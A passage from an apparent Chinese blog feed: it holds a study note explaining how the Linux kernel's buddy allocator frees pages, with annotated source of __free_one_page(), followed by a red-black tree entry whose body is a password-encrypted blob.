class="hljs-variable">__alloc_pages_nodemask</span><br></code></pre></td></tr></table></figure><h1 id="0x03-页的释放"><a href="#0x03-页的释放" class="headerlink" title="0x03.页的释放"></a>0x03.页的释放</h1><p>前面我们讲了页面是如何分配的，现在我们来看页面是如何释放的</p><h2 id="一、-free-one-page-：释放页面的核心函数"><a href="#一、-free-one-page-：释放页面的核心函数" class="headerlink" title="一、__free_one_page()：释放页面的核心函数"></a>一、__free_one_page()：释放页面的核心函数</h2><p>该函数是 buddy system 中用以进行页面释放的<strong>核心函数</strong>，所有的页面释放 API 都是基于该函数的封装</p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要作用是将特定页面释放到特定 zone 上，需要注意的是这里的 <code>one page</code> 不是一张页框而是一块连续内存（可能有多张页）</p><p>还需要注意的是这是一个释放页面的<strong>基本函数</strong>，故我们需要提供待释放页面的页结构体（struct page）、页框号、页面块的阶（order）、目标 zone、迁移类型等信息——这些信息通常由上层封装函数提供，这个函数所做的只是简单地将页挂回对应链表并检查合并的操作</p><p>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * buddy system 分配器的释放函数.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * buddy system 的想法是为多种“orders”的内存块</span><br><span class="hljs-comment"> * 维护一个直接映射表（包含位值）. 底部级别的表包含</span><br><span class="hljs-comment"> * 对最小的可分配内存单元（这里便是页面）的映射,</span><br><span class="hljs-comment"> * 而往上每更高一级则描述了从其下的一级的一对单元，因此是&quot;buddies&quot;.</span><br><span class="hljs-comment"> * 从高层看，这里所做的仅是在标记底层可用的表项，</span><br><span class="hljs-comment"> * 并根据需要向上传播更改，再加上一些与 VM 系统的其他部分</span><br><span class="hljs-comment"> * 良好协作所需要的计数。</span><br><span class="hljs-comment"> * 在每个级别, 我们都保持一个 pages 的 list, 作为连续的</span><br><span class="hljs-comment"> * 长度为(1 &lt;&lt; order)的空闲页的头节点并标记上 PageBuddy.</span><br><span class="hljs-comment"> * Page&#x27;s order 被记录在 page_private(page) 域.</span><br><span class="hljs-comment"> * 故当我们在分配或释放其一时, 我们可以得到另一个的状态。</span><br><span class="hljs-comment"> * 也就是说，若我们分配一个小的块，而两个都是空闲的，</span><br><span class="hljs-comment"> * 区域的剩余部分必须被分割成块. 若一个块被释放了，</span><br><span class="hljs-comment"> * 而他的 buddy 也是闲置的, 那么这将触发合并成一个更大的块</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,<br><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,<br><span class="hljs-type">int</span> migratetype, <span class="hljs-type">fpi_t</span> fpi_flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">capture_control</span> *<span class="hljs-title">capc</span> =</span> task_capc(zone);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buddy_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> combined_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">buddy</span>;</span><br><span class="hljs-type">bool</span> to_tail;<br><br>    <span class="hljs-comment">// 这里的 MAX_ORDER 和 pageblock_order 都是宏</span><br>max_order = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, MAX_ORDER - <span class="hljs-number">1</span>, pageblock_order);<br><br>VM_BUG_ON(!zone_is_initialized(zone));<br>VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);<br><br>VM_BUG_ON(migratetype == <span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (likely(!is_migrate_isolate(migratetype)))<br>__mod_zone_freepage_state(zone, <span class="hljs-number">1</span> &lt;&lt; order, migratetype);<br><br>VM_BUG_ON_PAGE(pfn &amp; ((<span class="hljs-number">1</span> &lt;&lt; order) - <span class="hljs-number">1</span>), page);<br>VM_BUG_ON_PAGE(bad_range(zone, page), page);<br><br>continue_merging:<br><span class="hljs-keyword">while</span> (order &lt; max_order) &#123;<br><span class="hljs-keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>migratetype);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>buddy_pfn = __find_buddy_pfn(pfn, order);<span class="hljs-comment">// 计算 buddy 页框号</span><br>buddy = page + (buddy_pfn - pfn);<span class="hljs-comment">// 计算 buddy 的页结构体，注意这里是指针加法</span><br><br><span class="hljs-keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="hljs-comment">// 页框号合法性检查</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="hljs-comment">// 检查 page 和 buddy 是否是一对</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们的 buddy（译注：释放页面的“配对”页面，可以看开头的注释） 是空闲的</span><br><span class="hljs-comment"> * 或其为 CONFIG_DEBUG_PAGEALLOC 的 guard page，</span><br><span class="hljs-comment"> * 与其合并后升到高一级的order。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page_is_guard(buddy))<br>clear_page_guard(zone, buddy, order, migratetype);<br><span class="hljs-keyword">else</span><br>del_page_from_free_list(buddy, zone, order);<br>combined_pfn = buddy_pfn &amp; pfn;<br>page = page + (combined_pfn - pfn);<br>pfn = combined_pfn;<br>order++;<br>&#125;<br><span class="hljs-keyword">if</span> (order &lt; MAX_ORDER - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/* 若我们到了这，这意味着 order &gt;= pageblock_order.</span><br><span class="hljs-comment"> * 我们想要预防在常规 pageblock 与独立的pageblock 之间的合并。</span><br><span class="hljs-comment"> * 没有这个，pageblock隔离可能造成错误的空闲页或CMA计数. </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们不想为了更频繁的低阶合并使用这个代码</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;<br><span class="hljs-type">int</span> buddy_mt;<br><br>buddy_pfn = __find_buddy_pfn(pfn, order);<br>buddy = page + (buddy_pfn - pfn);<br>buddy_mt = get_pageblock_migratetype(buddy);<br><br><span class="hljs-keyword">if</span> (migratetype != buddy_mt<br>&amp;&amp; (is_migrate_isolate(migratetype) ||<br>is_migrate_isolate(buddy_mt)))<br><span class="hljs-keyword">goto</span> done_merging;<br>&#125;<br>max_order = order + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> continue_merging;<br>&#125;<br><br>done_merging:<br>set_buddy_order(page, order); <span class="hljs-comment">// 在 page-&gt;private 中储存其 order</span><br><br>    <span class="hljs-comment">// 判断是插到链表头还是链表尾</span><br><span class="hljs-keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)<br>to_tail = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_shuffle_order(order))<br>to_tail = shuffle_pick_tail();<br><span class="hljs-keyword">else</span><br>        <span class="hljs-comment">// 该函数会检查是否下一个最高阶的 buddy 是否空闲</span><br>        <span class="hljs-comment">// 若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部</span><br>        <span class="hljs-comment">// 这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</span><br>to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);<br><br>    <span class="hljs-comment">// 插入特定迁移链表</span><br><span class="hljs-keyword">if</span> (to_tail)<br>add_to_free_list_tail(page, zone, order, migratetype);<br><span class="hljs-keyword">else</span><br>add_to_free_list(page, zone, order, migratetype);<br><br><span class="hljs-comment">/* Notify page reporting subsystem of freed page */</span><br><span class="hljs-keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))<br>page_reporting_notify_free(order);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们将与待释放页面凑成一对的内存块称为 buddy，所谓凑成一对便是<strong>这两个内存块在物理上连续，且能凑成一个更高一阶的大内存块</strong>，由此称之为一对 buddies</p><p>该函数主要流程如下：</p><ul><li>（continue_merging，循环开头）调用 <code>__find_buddy_pfn()</code> 计算待释放页面的 buddy 的第一张物理页的页框号，算法比较暴力：<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>调用 <code>page_is_buddy()</code> 检查 buddy 与 待释放页面是否是一对 buddies，若否，则跳到（done_merging），这里的检查需要满足四个要素：<ul><li>buddy 不在空洞中</li><li>buddy 在 buddy system 中（即 buddy 也是空闲内存块）</li><li>待释放页面与其 buddy 在同一个 zone 中</li><li>待释放页面与其 buddy 有着同样的阶（order）</li></ul></li><li>若 buddy 为 guard page，则调用 <code>clear_page_guard()</code> 清楚这个属性让其变成空闲页面，这里清除的操作是通过将 page 结构体的 private 字段置 0 实现的；若否，则说明是常规的空闲页面，调用 <code>del_page_from_free_list()</code> 将其脱链</li><li>此时我们的新的高阶内存块就完成合成了，接下来我们回到循环开头重新寻找这个合成的新内存块的 buddy，这个循环一直持续到 <code>max_order</code> （一般是10），作为下一次循环的页框号的计算方式是 <code>buddy_pfn &amp; pfn</code>，之后做指针运算 <code>page + (combined_pfn - pfn)</code> 找到对应的 page 结构体</li><li>若退出循环时的 order 满足 <code>order &lt; MAX_ORDER - 1</code> ，则调用 <code>has_isolate_pageblock()</code> 检查 zone 中是否有 isolate block，若是则进行相关操作（<del>这块代码还没看懂</del>），最后跳转回（continue_merging）；这一步主要是防止 isolate pageblock 与常规的 pageblock 发生合并</li><li>（done_merging）这一步主要是调用 <code>set_buddy_order()</code> 在 page 结构体的 private 字段存放该内存块的 order</li><li>若是设置了 <code>FPI_TO_TAIL</code> flag，则将 <code>to_tail</code> 置为 true；否则，若内存块的 <code>order &gt;= SHUFFLE_ORDER</code>（<code>MAX_ORDER - 1</code>），则将 <code>to_tail</code> 置为随机结果（<code>shuffle_pick_tail()</code>）；否则置为调用 <code>buddy_merge_likely()</code> 的结果，该函数会检查是否下一个最高阶的 buddy 是否空闲，若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部，这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</li><li>若 <code>to_tail</code> 为真，则调用 <code>add_to_free_list_tail()</code> 将该空闲页添加到链表末尾，否则调用 <code>add_to_free_list()</code> 添加到链表开头</li></ul><h2 id="二、上层封装函数"><a href="#二、上层封装函数" class="headerlink" title="二、上层封装函数"></a>二、<em>上层封装函数</em></h2><p>所有页面释放的函数其实都是对 <code>__free_one_page()</code> 的封装，最终都会调用到这个函数，路径如下：</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="buddy system" scheme="http://blog.arttnba3.cn/tags/buddy-system/"/>
    
  </entry>
  
  <entry>
    <title>【ALGORITHM.0x04】从二叉搜索树到红黑树</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-08-28T20:46:56.787Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="34f01c8b30823cf2c49dd6b881dac2b5e318081ca58d030d376f6e97dbe5cc74">afdbd80b698a50e90523fd700308ec65f44e06d46f63079433cfca60657b16ff93bb2b1a04d8edd7ab5ff0d1b5476a6fd26393991a7feb303675f276bef9bd6d95051256b4233fa4340b26aa06280f64514ab8c3b30fa20ac5118fcb917d57ad3b481c5c43dd420e88cf175e2bce126ca7455645d534362aa994abb13840873a37663e8b81b982c07841c33324b08b12b6f9e408b86735ee54ba9778c62bb56800f1576484673f5a74e0c404176bcc45bce18c91cc268793a759e3f42a7371803e83d9bec68e1787cfcae81d0d40155bec8ea944f76fc70766fef9eba27a88423ec1cb22596090ad16dce1f9b273d9fca901029e3caef77f644fa69102f8fc40624811236eb96ced5b894d6d12c72e4e8f481c40641c4c361ed34c3e01611e6afac1028efd46b20846f89bc09388f39b44901b1718ecaa3e341a378e7c9536c90d8a4c2335596607bac029ea5df4f08068752d7fdebefb83c9f1f6e5857066fa344bc26c954482057917acd1738a56add0abc05609608b67402fe13f2937d7bff6c3421d07bb97962ffe6f2a928e99ed168cf98e304fda7001238747a9937921a4854cde5f196a128ccf656f526f52391a3ade33179216029e7f9cb2196609919d42a360d3e19360e5c87e5ac562cc5c4b80a8a0628e4b12588ef34028bc9b068960e9d10b55885977b219e65272c3399ef7bde3c97d8fb131d2a96bdc82e472f415aa7aeb8ac859b48a44b3c6d4d37c6c6c191eba3f6eb311b3c4e2e4a47539a29c87c1e83ded2f89758fddb540937155396443310d8fd39cf224a1a2df3c2cc90243052b9fbe77b7139a184c719d720c675ef36fd754c08aab35e2e988f4221874f9c9ce9e1f2fefc223a458a62b9b2c43621fa0ac4fb70b63ea5405a23b8888ab9a8fc61af9f8bf65be4ad4c74b69bce172073bfe6060a5599961be6037c5e68c31f4d9d9d45bc39995873f4ab69bfe27da6563ddc45a9a397dbb2e4393ea1faf9ee90b6f0d46ac304560e1560fd0c9b9cc38afe3674fd486fb07e1833e5bd562d5e729efda52aa95453ab8298a8ad04375898ab3311ee7086db7013af5405051dbf080c5e04190d6dbe8e8dbacbe88868e722592ec3d86183f3f0242351ce660a3469830fbd6177095202f3353840186d8270028efc7f450d191a69ad1fe713e8c7d129250d950bbdc8fa309550946c460741b22ea44dbd702cd5b1fa1ee26861cf2c09c107cbe6ba760e2744eb51561ac898343eccd715573c41618cdecb839108688e2e399a8373413ab587a4813dd1ff92b1cc969c36531a9b745cfb659b2312143f5eb76e538e726da551ffb4b1b3122b4bbd327103dc4d19e8fc4afc1035c58489711a9290ccd11d18660fe09a0589e025c5204e8b407e3799e6be400b3c78a110684807630ce112927ec8a5997ac621757134c34de14eb60f5e8a6588e6cdbf1b11a69154716742b2801ca9573de6d10094cc9340f19580f0fe2f1f6cecd9dbd2cb64e613d9cad1ccb995c1300a0eb1874602588ae627c0dbff16ad30e8e36655bed515f2b6f1f7e72a941fc5dcd284e9ee4654700e02afb92bb15005ba79d6a6e24eefa5a23009cc12d1ec42488452a39b73fd9594439c1f9fa3fadd3c9eb7f4ec8a937fa3c1d4ae49f1dcbc0cb8b7ef24bafa1f847879b20ba5c6ea8c1d9485017d20638d8e9a46e4dc8793e2c7dca2ffd845120dffef2a90aa3447d9750f0d38d145a7c658276c45cd0757397d32a7cdb101a37eac891452a7bc1437ddf56d2dde76a87477ec198672b3c27de67fd8873e16c0bf5f00822302cd4a0fb6e861c2ecfe6102ea6bedda14cf5be61d4453e0a3057a2471ae8047b38bb23a54e2b61640d3ea58c80f7c5c9626a108914d64b91c8588fcce80d284717b55d00059e2e65877beed47732b80fab0c3cb5b9f09c0cfd8b99f421bd25b1baef1804175f6a29b174ced750995f5f5aefc494f815922f5e537b712aa488da6929ae88291aa2f157d2110183191ab8e97370cdf5885e7e116c950c5e51950cb1925e51bb29ad0ba927556985031120d35d64ee3c8214f11ba602497f934d9e32e6c978cb5924d878520c2f9b155ec1892e1c14ff9d2164984a0ef27911e6dd47d7ee7a7c5d47e7b84b7c09006a42b1c71c673af82cb6dd776a4982e0a52d3f22c51010ede6c43c1e01a5a5df2acb806666b3d02f9512b24e9f6ed34c1f0a7554e1084e609af6eccf87592e7f4c13ead67ca704f073ed333c6a439e98d8e6b5940de6145c21dc21634524c30050edbcae335fca691c3762646a0ee351c95fe709fa8407f6f616c549410b8c7aaac737457161275dba74e2de298df42e1983dc7e4192203eebf4f7572e13157cb43cefc3f81b6ebce1f053f1f04bb44d9c63052695efb24e8081b8f59ed155818be8c8e421631ef032f911fcabc34d73c0c7371e038a5876e5d8a341d2a6160c22249cdbfb682cb7e1514be3e83b707f3829a3680c516935e56db1085e6667440cad76e73c47820d9c31707ca47fafc9ad67b12a206386c848306eb31b7a4278d7d57149c9a00ee5e6ba383192c39ec01a4d1ea162eca1d1fcd91ad92c2dc701aea8a23c62b933149bce6196d87a485d52bd4389276e414f9462cacb529d85c65c0394c85f3627b6c19bdfa06abd220e1dd9184dd8b0af7b15e79bb9d8361b84c3cf28e6742d24463e746280c6d5273c7513a822cd45122aeb4dc595efe5412548f483a9c1184ce7b66f20715883c354c1893a022e511ad435b9fdf67040d1a8d4cac7f692fc2eefdf8fdb40608a515031d56e54cb63c643bdfc05cc7b62d02bbb11d3b93f3706a141e242a0cd29449ecca7604d38d86cf7d62a39153e166515e3933e6c08c998cfc703a3b57bf5101fa01cfd4cd7c48b26a5bd0a26ff1504390852719de6cce318b09e6b19252fe3508163822946328db422646ecfa28ebbe19800ca985bc437cc3aa88e9c174b3b9b07c151df298fc831e154987847dc8811c0a9840b1e7657689c3f39abcb3802d63018f5796dcec9a102bb03f56601aad9e8e5d4229490863d517ca7898a39a3e48ae60649d2ed97c126e408fa38f61ff4af5d21eb1463bb4bf003f2906b38e39dba02ecfad467eb360d18dcb9ca4abd91f27b247f487aa0f3effebe9e3dbb6f857322b5ed98d4434e9feefa85377ebe04f0d7848ff53ca61a3a755ca60e078d382ea65cccd2b8d680985733e7564f28d4a8d07c22eefa72cfa14ac75cd89d59d9e7092a7c0eb8fc930220a6474bc69e214dfca7074fec3f0b10bfcda623535ce173e068166d6c736c0c69119044c9c5e649f11cb5f9c4414117f9b8f709ee7ce7ef510301b77398bef943ec98c09648ad1c5ebe53763ad3b7f54e7e5ad8a452f054271c15b56c1e81d8ab5b250d275da2cf977b6a20e8bab8c8079ef9a462935583958b42220910d21b8f9410a949cab367087b9bfd14beb76c54d8ba9b0223e0e3b0b3b9611f0f8fb83183c1966af78b6a86a78c495e8b03c952904765b664579515c6213d873793ca27bf940cb3d945106a9ae4f75e354ee07be3225c9fd9b5b339334be10a06783e5f35cd9b179d85c9b9cbfb55482d7c3601cc59096aeb042feef68eddaa1f31bace90b1459249e79484b4dd10c683ce3b5efcc582d0af3365c0029364c5768becee185db102afa8921a1ffd6c90023614527c4d4368f3c9d6574031e857d0c5301f0712a363d57b84d302021840174ea9ac95cca5c3be65839a67a1ef661790c7f1cb635978b06e030aabd4f7df82e6b68717c056d4640923e1579a2931876fa7904f7c3076ff945990dd131cd1accecb9e773eebbfc970d0cb8932aad7dec1df6c0279a58dd3b3c2370667803845bf543fded5877108d1797224980a216c443a77fa4ac10c37ca0a59b54adf75395aa50fee1aec3982dac06db545f796b82bd12ee891250fd1f91587c93223543cb9bf47a3b872644c59f848324bf14cb747e780e725ac9ecebab8bb7bbd4eaee40fb009892ab4e44db917b3c8499f8e378957dc90802ac97ee3cd0caea98461fbe86c41d13853fd39171b9cc8696dd7e0577fa5dc37ae88ee55c4dd18d3c03e36ab22c79ef86bf72820077dbd907587e4efebb0c02ccfc12943de9c7e07c4bbc664103fc701198537507e4165721c4abe6fdbeb793d4ae9a6ba5cdca5c377524133eb689374dfe01e1c27436b40de7797d24d9776fcbe8a4a0867356db8c37740afeb2a4b437e8dab6f5c9f149c7968474d1654c562728b8401ad33d1c404cf8f306d822718ddfb853cd72eb5360ba640b3526af856f568e6d666a92772ef7041f35b7d7b60ee088e9a5f79d5de90de1b1b9f856b3517bf1c8fa1e748d935509640cdaccfcbfb74015eaf047062db6855b11d90a4ca067209c5d7cb4f837dc6aac9b73869f6b17dac5acff5ff26c5b87af17e58f31e766a47b0cdadbf390aaddaf9b289f285e86823e30fdf17577f4d2c0b2328e8d0f6325a55585e5309e3645e5af0709addcb7d847863d3708894b607fe2082cedb94f23790f04bf58c85194253470a0d2e0f4c92987dff056a294838562d5559fdc97baaa357f49326018ee5cca9f7a302bcd14aede1620a02ecb1102375fef037d60432c4605f0db2e7337ce1fea3000b3e31f122d672316c9f3ab054bb2ada3cba14b225cfef1c87fbbcea2deeeaa472a91d3c7fdec9f2923394586c5e8def4664d8ef80721f16b7164563cc5eba0fb68c26e5ba70755b2f4d743eb431e5e2a9a57232b87a5d010bcc551bc79a5c595a53ab67db647755b9279fe6213e5240c992f8fbfce77a61c5afb51fda0becc7013edb881d43a0bb566410d8a4441657a77a95e840fe0a218b8c655d93b9994e425364e1b9319d984400df0f6fd375e19a38c7d2d017ce5e4fc538300b44c30cf1867ca67fb1ba5205c9dc7ccc3e5cd767c19df30dbcfff0290a444a0fb02d14ebb26b4bc78f58fa9328ceb869d6a73309e4719b37f972492d5a9ce925e9066fa672f3b321e819ab47ba4478250a61178ede2c0e660c8c71e19fde4ddb0bf5d1301e954e1c20f7528968517bc93d9dba397b05147813cd1423036f28e98adfe17b8f1f0791c80158773af82892f47c9bca38d8e5ba26ee4d1cbdb5b8f029b9021fac67d449fb5a2e6f4e4a19ad0683c27a1ea6dd1aebe8569b0abdbec73de4d872637d9a6df80b987ebe2b850e06260a8ef16066595e741f4202a56e6ab0cc2c6bc8caa689cac578228bd46fd52aec586a354d38e10827067200fbae34f2f73d9d355ba2f0eb77b2af7d07da7b2a6bd6855b97f822e791043dce611b61bf06506b625e30e9e2d681b4b1f71dabec54eef6c1bdd55255dd4b46ac78e3a06c28de32ded55053bfffe4e317525d94d8dc602c11fac11d067457a7ce5e1ab7a54c17447fa4bb7547fb0be08a4e08b93519b7e0935ebbf40b3e7646f1d132237d2ffcb55db2d9a0a41689a5c478e40cb6dddb53107d28128969cbab9679121226057888e92a547d69fc3e63ed74f685f3668fc33d6492b7b0da23126e854fffbb052e6e85ce8b66799bca2fc3c19427f145e6da2880d869fa9eba47f8a6c0e1c2b2bc458763f6ef6897dbd0a434f75d7bf918209c437932b1bf1dd10da112d9d22a4fee80c3851337e3b8aa79563f0a0f002e8d2b10be6021d993f7bbc6b308c5e7f957455f9bbc804b5bab1ba5d2f4cfa21ee98062e3bbd5d8d0ca80bbff63a224c546f236bf6e207168522efe838bffea347e44420ddb7949c1264fd8ec356f7f0e0cb4468cbe61b53a2c805000d31a7e073e26da3c07f714de29f90bde199d4c1c75c8e487ec31033abe3ea89034be925c73912ec3b58bd661978334ca95fa13b2ceedae753dc7efac8d4a169a0c40aa0a6592bd99d4e01056c860c2bbd9bfdd2c8c675b7e172ad2974eac30b4f4cac45a18e1e7d1f1f58744554726e35be3d2071567d48ddf70d7d7a16c8f390b0d45d96585309c223cb717d73e61e74c51e5f0b6f6d4193cc534d1ba4709e672f686a07675cfb02d532c2b90ce8da9f033b9aa09a7da587c3ade262251f4d740b0f56df96d080e045cb6d99eac499517174c846328e0179e7496c700e078cf578047902341d56e55e83e1e8390a1008fe10ff3abdfaf8cbf31f9c00bf9e792c5dfd8e3a24d9a8b5e9447c72b944284d6d1120673882d8b3f39e79666d6c3d2ec87c2d80da550ae6fa745859dfcd9698dc5ba1ab581caaf02daf16e4008126e94e81ced4c812597451788a7b482205d9deb02157f30a1efac8c0b0cb964fc77b0533e9283a23e7ba2ed72e3cb918032314e97930df265322ca95f789c67bf1c592a0b470cea3015ec7c21e5bc6401d184200362107cb4d8dac230ade4df2dfe0b471ab213225fa9f0a12936610bc846408da087154e3d4d2b60bfb0f62034c95a5a2fc98fb8b0dc4d4074a24280648b53f033d86663275bb552f0cb32334047c957a17d392c6a0f1d519982c99911bbdef06d4a22f5bf2119c8f1fe51c2290a2567e3c81a150c633fe7c5a093e8324c9376770c8a55ec5975dbdf046c5420c229e480b18c01b1ac5ea5aa82e60f7f33115331567a8daf2fca22bcb10b6d70000a17aeb2d0accbea423a45ce7a0a3ab6a54d90a4afb3e0531635fa48173cea6db89c03d86b280d932bbbaf207992849fb1bd0671637e93180d41d642af4a6f63c14b7be6d9ee7b1629ba6bc607b7ab568a6c5df3741f207b276db08587a5ae1f392313c559fcb047771c5a5adc57077f80918cde2565fc14f1877902ac693757ec6daf9d5671148ff6d2d7051637fef4baf00b539cfc61820a39a485c4077980a188f87572305f49bfdf41ba4cca7e39027230bdaf3906ce9ab70a65e3d0fcf5b84cbb54cc2a954b32d592f1e2ab1b544b8952b2fdba1e72aea42c2127d4aad4d5577af94e56e6179c7dea6c5071ca35a472f77ec8531ff1b01d949ac291b4c5963eb6e043f2b93241e7d5b0727e9d5e25d0749f578bd1095996a6d4b9d3f897fa29a41c7eeff56575c651846633753cb0e7f3ee915c536e04104bcb604c62bca9e31c16edc4ec9304e31e7b3d992371bd33b8c4b79a8aa1bfb11fe26713e1eb219f7167424a00c190177a9ddc8f911d123a365521d504af33bdaf770960b83bf86e4fc266f9e904b92aa26e4ac7c99134b56a2438a8da924a4137774007ad6480963b44798768b727117ec90237c1237d3af2f894fd61af4e282aaa23c893838259c1b63b7a119cff294d6d63dcc33b78d72590f237bde39fcf8f8f41eb884cd7d254e8d9653050e62a675292b1314c8b94acbca9f29886991cec81fc79a7c41e3a1dd146d99d9297f9978c205664107445ba0d18f119094526d714523b9e35f984855f1fb29b725e8903bba06fb7b86d72237e0641de3b79ab3dfbfc1b8e44405c0eec56201ddb8b5530640f31e2b1a6ae6436810b5960f5b7590787bc9bc5d8811fc6056fc5b8e056cac2fd56566425144fe15e6aca0af86212556c1e5a6a94ec6a83c686327ff28e5df7682122c0afd4b3e01d31eefcfc14ebb8c875456dd4126260530c6dbe6e2e4a1f989ef76519f096abd3307cd2c3f2af043d9051bf96c7ad8a0efac3370c3f6067ecb2ae18c13a2b045a86b9611d6078ce1503105e5d194b4e0c23aa2939d4e3d08a2ee9bf6cd8a73d90439d48c2aa3fef3d374c0a4d2f67109335665adbb339ba36423605660c65c1322bbc6db06160ee1b6dc970453678218d0ea2eb388dc1131836b92053c30ddb362108af865d4a26d6005f78973c74de8fd0a536c7532326bf9c62fca5fbf90056922041f7e9ce8d227c8c5bd26b0bf02b4c5be88304eec243686fa2643